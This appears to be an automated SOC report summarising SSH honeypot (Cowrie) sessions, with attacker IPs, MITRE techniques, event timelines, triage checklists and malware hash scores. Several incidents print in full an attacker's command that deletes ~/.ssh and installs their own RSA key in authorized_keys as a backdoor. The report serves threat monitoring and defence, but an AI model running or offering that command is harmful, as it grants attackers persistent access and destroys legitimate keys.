| `2026-05-27 16:33:31` | `cowrie.command.failed` |
| `2026-05-27 16:33:31` | `cowrie.log.closed` |
| `2026-05-27 16:33:32` | `cowrie.session.params` |
| `2026-05-27 16:33:32` | `cowrie.command.input` |
| `2026-05-27 16:33:32` | `cowrie.session.file_download` |
| `2026-05-27 16:33:32` | `cowrie.log.closed` |
| `2026-05-27 16:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790599a3de8a

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:33 |
| **Last Seen** | 2026-05-27 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:33:34` | `cowrie.session.connect` |
| `2026-05-27 16:33:34` | `cowrie.client.version` |
| `2026-05-27 16:33:34` | `cowrie.client.kex` |
| `2026-05-27 16:33:35` | `cowrie.login.success` |
| `2026-05-27 16:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d384842e1e94

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:34 |
| **Last Seen** | 2026-05-27 16:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:34:14` | `cowrie.session.connect` |
| `2026-05-27 16:34:14` | `cowrie.client.version` |
| `2026-05-27 16:34:14` | `cowrie.client.kex` |
| `2026-05-27 16:34:15` | `cowrie.login.success` |
| `2026-05-27 16:34:16` | `cowrie.session.params` |
| `2026-05-27 16:34:16` | `cowrie.command.input` |
| `2026-05-27 16:34:16` | `cowrie.command.failed` |
| `2026-05-27 16:34:16` | `cowrie.log.closed` |
| `2026-05-27 16:34:16` | `cowrie.session.params` |
| `2026-05-27 16:34:16` | `cowrie.command.input` |
| `2026-05-27 16:34:16` | `cowrie.session.file_download` |
| `2026-05-27 16:34:16` | `cowrie.log.closed` |
| `2026-05-27 16:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f07af798f8a3

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:34 |
| **Last Seen** | 2026-05-27 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:34:19` | `cowrie.session.connect` |
| `2026-05-27 16:34:19` | `cowrie.client.version` |
| `2026-05-27 16:34:19` | `cowrie.client.kex` |
| `2026-05-27 16:34:20` | `cowrie.login.success` |
| `2026-05-27 16:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad95709c369b

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:35 |
| **Last Seen** | 2026-05-27 16:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:35:10` | `cowrie.session.connect` |
| `2026-05-27 16:35:10` | `cowrie.client.version` |
| `2026-05-27 16:35:10` | `cowrie.client.kex` |
| `2026-05-27 16:35:11` | `cowrie.login.success` |
| `2026-05-27 16:35:11` | `cowrie.session.params` |
| `2026-05-27 16:35:11` | `cowrie.command.input` |
| `2026-05-27 16:35:11` | `cowrie.command.failed` |
| `2026-05-27 16:35:11` | `cowrie.log.closed` |
| `2026-05-27 16:35:11` | `cowrie.session.params` |
| `2026-05-27 16:35:11` | `cowrie.command.input` |
| `2026-05-27 16:35:12` | `cowrie.session.file_download` |
| `2026-05-27 16:35:12` | `cowrie.log.closed` |
| `2026-05-27 16:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-392dfd0426ce

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:35 |
| **Last Seen** | 2026-05-27 16:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:35:14` | `cowrie.session.connect` |
| `2026-05-27 16:35:14` | `cowrie.client.version` |
| `2026-05-27 16:35:14` | `cowrie.client.kex` |
| `2026-05-27 16:35:14` | `cowrie.login.success` |
| `2026-05-27 16:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187b2c989d89

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:36 |
| **Last Seen** | 2026-05-27 16:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:36:59` | `cowrie.session.connect` |
| `2026-05-27 16:36:59` | `cowrie.client.version` |
| `2026-05-27 16:36:59` | `cowrie.client.kex` |
| `2026-05-27 16:36:59` | `cowrie.login.success` |
| `2026-05-27 16:37:00` | `cowrie.session.params` |
| `2026-05-27 16:37:00` | `cowrie.command.input` |
| `2026-05-27 16:37:00` | `cowrie.command.failed` |
| `2026-05-27 16:37:00` | `cowrie.log.closed` |
| `2026-05-27 16:37:00` | `cowrie.session.params` |
| `2026-05-27 16:37:00` | `cowrie.command.input` |
| `2026-05-27 16:37:00` | `cowrie.session.file_download` |
| `2026-05-27 16:37:00` | `cowrie.log.closed` |
| `2026-05-27 16:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347a8b8edce3

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:37 |
| **Last Seen** | 2026-05-27 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:37:03` | `cowrie.session.connect` |
| `2026-05-27 16:37:03` | `cowrie.client.version` |
| `2026-05-27 16:37:03` | `cowrie.client.kex` |
| `2026-05-27 16:37:03` | `cowrie.login.success` |
| `2026-05-27 16:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a4543144fe

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:39 |
| **Last Seen** | 2026-05-27 16:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:39:01` | `cowrie.session.connect` |
| `2026-05-27 16:39:01` | `cowrie.client.version` |
| `2026-05-27 16:39:01` | `cowrie.client.kex` |
| `2026-05-27 16:39:02` | `cowrie.login.success` |
| `2026-05-27 16:39:02` | `cowrie.session.params` |
| `2026-05-27 16:39:02` | `cowrie.command.input` |
| `2026-05-27 16:39:02` | `cowrie.command.failed` |
| `2026-05-27 16:39:03` | `cowrie.log.closed` |
| `2026-05-27 16:39:03` | `cowrie.session.params` |
| `2026-05-27 16:39:03` | `cowrie.command.input` |
| `2026-05-27 16:39:03` | `cowrie.session.file_download` |
| `2026-05-27 16:39:03` | `cowrie.log.closed` |
| `2026-05-27 16:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17af9d8ca677

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:39 |
| **Last Seen** | 2026-05-27 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:39:06` | `cowrie.session.connect` |
| `2026-05-27 16:39:06` | `cowrie.client.version` |
| `2026-05-27 16:39:06` | `cowrie.client.kex` |
| `2026-05-27 16:39:07` | `cowrie.login.success` |
| `2026-05-27 16:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16fce0cefeef

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:40 |
| **Last Seen** | 2026-05-27 16:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:40:19` | `cowrie.session.connect` |
| `2026-05-27 16:40:19` | `cowrie.client.version` |
| `2026-05-27 16:40:19` | `cowrie.client.kex` |
| `2026-05-27 16:40:20` | `cowrie.login.success` |
| `2026-05-27 16:40:20` | `cowrie.session.params` |
| `2026-05-27 16:40:20` | `cowrie.command.input` |
| `2026-05-27 16:40:20` | `cowrie.command.failed` |
| `2026-05-27 16:40:21` | `cowrie.log.closed` |
| `2026-05-27 16:40:21` | `cowrie.session.params` |
| `2026-05-27 16:40:21` | `cowrie.command.input` |
| `2026-05-27 16:40:21` | `cowrie.session.file_download` |
| `2026-05-27 16:40:21` | `cowrie.log.closed` |
| `2026-05-27 16:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d42214a5f7

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:40 |
| **Last Seen** | 2026-05-27 16:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:40:23` | `cowrie.session.connect` |
| `2026-05-27 16:40:23` | `cowrie.client.version` |
| `2026-05-27 16:40:23` | `cowrie.client.kex` |
| `2026-05-27 16:40:24` | `cowrie.login.success` |
| `2026-05-27 16:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec4948579516

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:40 |
| **Last Seen** | 2026-05-27 16:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:40:41` | `cowrie.session.connect` |
| `2026-05-27 16:40:41` | `cowrie.client.version` |
| `2026-05-27 16:40:42` | `cowrie.client.kex` |
| `2026-05-27 16:40:43` | `cowrie.login.success` |
| `2026-05-27 16:40:43` | `cowrie.session.params` |
| `2026-05-27 16:40:43` | `cowrie.command.input` |
| `2026-05-27 16:40:43` | `cowrie.command.failed` |
| `2026-05-27 16:40:44` | `cowrie.log.closed` |
| `2026-05-27 16:40:44` | `cowrie.session.params` |
| `2026-05-27 16:40:44` | `cowrie.command.input` |
| `2026-05-27 16:40:44` | `cowrie.session.file_download` |
| `2026-05-27 16:40:44` | `cowrie.log.closed` |
| `2026-05-27 16:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412f3a8d7f88

| Field | Detail |
|---|---|
| **Source IP** | `172.174.72[.]225` |
| **First Seen** | 2026-05-27 16:40 |
| **Last Seen** | 2026-05-27 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:40:47` | `cowrie.session.connect` |
| `2026-05-27 16:40:47` | `cowrie.client.version` |
| `2026-05-27 16:40:47` | `cowrie.client.kex` |
| `2026-05-27 16:40:48` | `cowrie.login.success` |
| `2026-05-27 16:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.72[.]225` to AbuseIPDB if not already reported
- [ ] Block `172.174.72[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d7dcd55cb3

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:42 |
| **Last Seen** | 2026-05-27 16:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:42:03` | `cowrie.session.connect` |
| `2026-05-27 16:42:03` | `cowrie.client.version` |
| `2026-05-27 16:42:03` | `cowrie.client.kex` |
| `2026-05-27 16:42:03` | `cowrie.login.success` |
| `2026-05-27 16:42:04` | `cowrie.session.params` |
| `2026-05-27 16:42:04` | `cowrie.command.input` |
| `2026-05-27 16:42:04` | `cowrie.command.failed` |
| `2026-05-27 16:42:04` | `cowrie.log.closed` |
| `2026-05-27 16:42:04` | `cowrie.session.params` |
| `2026-05-27 16:42:04` | `cowrie.command.input` |
| `2026-05-27 16:42:04` | `cowrie.session.file_download` |
| `2026-05-27 16:42:04` | `cowrie.log.closed` |
| `2026-05-27 16:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371eec9cbb72

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-27 16:42 |
| **Last Seen** | 2026-05-27 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 16:42:07` | `cowrie.session.connect` |
| `2026-05-27 16:42:07` | `cowrie.client.version` |
| `2026-05-27 16:42:07` | `cowrie.client.kex` |
| `2026-05-27 16:42:07` | `cowrie.login.success` |
| `2026-05-27 16:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `35.225.56[.]202` | **17** | 2026-05-27 13:39 | 2026-05-27 14:08 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.35.127[.]66` | **15** | 2026-05-27 16:12 | 2026-05-27 16:43 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.174.72[.]225` | **15** | 2026-05-27 16:13 | 2026-05-27 16:42 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.43[.]0` | **5** | 2026-05-27 13:49 | 2026-05-27 13:50 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.36.108[.]213` | **2** | 2026-05-27 13:38 | 2026-05-27 13:40 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.195[.]126` | **2** | 2026-05-27 16:15 | 2026-05-27 16:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `24.104.230[.]186` | **2** | 2026-05-27 16:46 | 2026-05-27 16:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]245` | 1 | 2026-05-27 16:13 | 2026-05-27 16:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]66` | 1 | 2026-05-27 16:10 | 2026-05-27 16:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.29.110[.]89` | 1 | 2026-05-27 14:04 | 2026-05-27 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.4[.]29` | 1 | 2026-05-27 13:58 | 2026-05-27 14:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `174.76.38[.]124` | 1 | 2026-05-27 16:59 | 2026-05-27 16:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.96.151[.]198` | 1 | 2026-05-27 13:45 | 2026-05-27 13:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.184.76[.]247` | 1 | 2026-05-27 16:25 | 2026-05-27 16:25 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]36` | 1 | 2026-05-27 16:25 | 2026-05-27 16:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.189.25[.]100` | 1 | 2026-05-27 15:22 | 2026-05-27 15:22 | 4s | 0 | `T1592` | 🟢 LOW |
| `221.13.116[.]54` | 1 | 2026-05-27 17:07 | 2026-05-27 17:07 | 12s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]135` | 1 | 2026-05-27 14:03 | 2026-05-27 14:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]251` | 1 | 2026-05-27 14:06 | 2026-05-27 14:06 | 1s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]253` | 1 | 2026-05-27 14:03 | 2026-05-27 14:03 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
